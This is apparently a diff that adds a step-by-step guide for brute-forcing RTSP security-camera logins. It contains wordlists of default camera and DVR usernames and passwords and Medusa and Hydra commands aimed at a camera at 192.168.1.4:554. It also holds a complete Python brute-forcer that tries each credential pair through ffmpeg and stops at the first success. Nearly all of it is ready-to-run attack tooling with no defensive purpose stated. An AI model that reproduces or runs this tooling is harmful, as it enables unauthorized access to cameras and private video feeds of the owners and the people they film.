@@ -1,0 +1,268 @@
+//////////////step1////////////////
+cat > ~/users.txt << 'EOF'
+
+666666
+888888
+Admin
+admin
+admin1
+administrator
+Administrator
+aiphone
+Dinion
+none
+root
+Root
+service
+supervisor
+ubnt
+admin@123
+Admin@123
+ADMIN
+EOF
+
+//////////////step2////////////////
+
+cat > ~/passwords.txt << 'EOF'
+
+0000
+00000
+1111
+111111
+1111111
+123
+1234
+12345
+123456
+1234567
+12345678
+123456789
+12345678910
+4321
+666666
+6fJjMKYx
+888888
+9999
+admin
+admin123456
+admin pass
+Admin
+admin123
+administrator
+Administrator
+aiphone
+camera
+Camera
+fliradmin
+GRwvcj8j
+hikvision
+hikadmin
+HuaWei123
+ikwd
+jvc
+kj3TqCWv
+meinsm
+pass
+Pass
+password
+password123
+qwerty
+qwerty123
+Recorder
+reolink
+root
+service
+supervisor
+support
+system
+tlJwpbo6
+toor
+tp-link
+ubnt
+user
+wbox
+wbox123
+Y5eIMz3C
+admin@123
+Admin@123
+1234567a
+ADMIN
+EOF
+
+//////////////step3////////////////
+
+check file exists
+
+ls -la ~/*.txt
+///////////Medusa before hydra////
+
+sudo apt install medusa -y
+medusa -h 192.168.1.4 -U ~/users.txt -P ~/passwords.txt -M rtsp -n 554 -f
+
+
+//////////////step4////////////////
+
+
+sudo apt update && sudo apt install hydra -y
+sudo apt install hydra -y
+
+
+//////////////step5////////////////
+
+hydra -L ~/users.txt -P ~/passwords.txt -e ns -f -V rtsp://192.168.1.4:554
+
+
+////////////step6//////////////////
+
+
+
+#like that python scripts based on our saved password and username files//
+////////////step7//////////////////
+sudo apt update && sudo apt install ffmpeg -y
+
+////////////step8//////////////////
+save the code as 
+
+nano ~/brute_rtsp.py
+
+////////////////////code to paste 
+
+#!/usr/bin/env python3
+"""
+RTSP Credential Brute-Forcer (Interactive)
+Asks for IP and Port, then reads ~/users.txt and ~/passwords.txt
+"""
+
+import subprocess
+import sys
+from pathlib import Path
+
+# --- CONFIGURATION ---
+USERS_FILE = Path.home() / "users.txt"
+PASSWORDS_FILE = Path.home() / "passwords.txt"
+TIMEOUT = 8  # seconds per attempt
+
+def read_lines(filepath):
+    """Read a text file, strip whitespace, keep empty lines."""
+    if not filepath.exists():
+        print(f"[ERROR] File not found: {filepath}")
+        sys.exit(1)
+    with open(filepath, "r", encoding="utf-8") as f:
+        return [line.strip() for line in f]
+
+def test_rtsp(ip, port, username, password):
+    """
+    Try to open the RTSP stream using ffmpeg.
+    Returns True if credentials work, False otherwise.
+    """
+    # Build RTSP URL
+    if username and password:
+        url = f"rtsp://{username}:{password}@{ip}:{port}/"
+    elif username:
+        url = f"rtsp://{username}@{ip}:{port}/"
+    else:
+        url = f"rtsp://{ip}:{port}/"
+
+    # ffmpeg command: probe for 1 second, suppress output
+    cmd = [
+        "ffmpeg",
+        "-rtsp_transport", "tcp",
+        "-i", url,
+        "-t", "1",
+        "-f", "null",
+        "-"
+    ]
+
+    try:
+        result = subprocess.run(
+            cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=TIMEOUT
+        )
+        # ffmpeg returns 0 on successful read
+        return result.returncode == 0
+    except subprocess.TimeoutExpired:
+        return False
+    except FileNotFoundError:
+        print("[ERROR] ffmpeg not found. Install it with: sudo apt install ffmpeg -y")
+        sys.exit(1)
+    except Exception as e:
+        return False
+
+def main():
+    print("=" * 60)
+    print("       RTSP Credential Brute-Forcer")
+    print("=" * 60)
+
+    # --- ASK FOR IP ---
+    ip = input("Enter target IP address (e.g., 192.168.1.4): ").strip()
+    if not ip:
+        print("[ERROR] IP address cannot be empty.")
+        sys.exit(1)
+
+    # --- ASK FOR PORT ---
+    port_input = input("Enter RTSP port (default: 554): ").strip()
+    if port_input == "":
+        port = 554
+    else:
+        try:
+            port = int(port_input)
+        except ValueError:
+            print("[ERROR] Port must be a number.")
+            sys.exit(1)
+
+    print("=" * 60)
+    print(f"[+] Target : {ip}:{port}")
+    print(f"[+] Users  : {USERS_FILE}")
+    print(f"[+] Pass   : {PASSWORDS_FILE}")
+    print("=" * 60)
+
+    users = read_lines(USERS_FILE)
+    passwords = read_lines(PASSWORDS_FILE)
+
+    total = len(users) * len(passwords)
+    print(f"[+] Loaded {len(users)} usernames and {len(passwords)} passwords ({total} combos)\n")
+
+    found = 0
+    attempt = 0
+
+    for user in users:
+        for pwd in passwords:
+            attempt += 1
+            display_user = f'"{user}"' if user else "[BLANK]"
+            display_pwd  = f'"{pwd}"'  if pwd  else "[BLANK]"
+            print(f"[{attempt}/{total}] Trying {display_user} / {display_pwd}", end="\r")
+
+            if test_rtsp(ip, port, user, pwd):
+                print(f"\n[✓] SUCCESS! {display_user} / {display_pwd}")
+                found += 1
+                stop = input("Stop testing and exit? (y/n, default: y): ").strip().lower()
+                if stop == "" or stop == "y":
+                    print("\n[*] Exiting.")
+                    sys.exit(0)
+
+    print(f"\n\n[*] Done. {found} valid credential(s) found.")
+
+if __name__ == "__main__":
+    main()
+
+////////////step9//////////////////
+#make it executable
+
+chmod +x ~/brute_rtsp.py
+////////////step10//////////////////
+
+python3 ~/brute_rtsp.py
+
+////////////step11//////////////////
+
+
+
+
+
+
+
+
+
+    
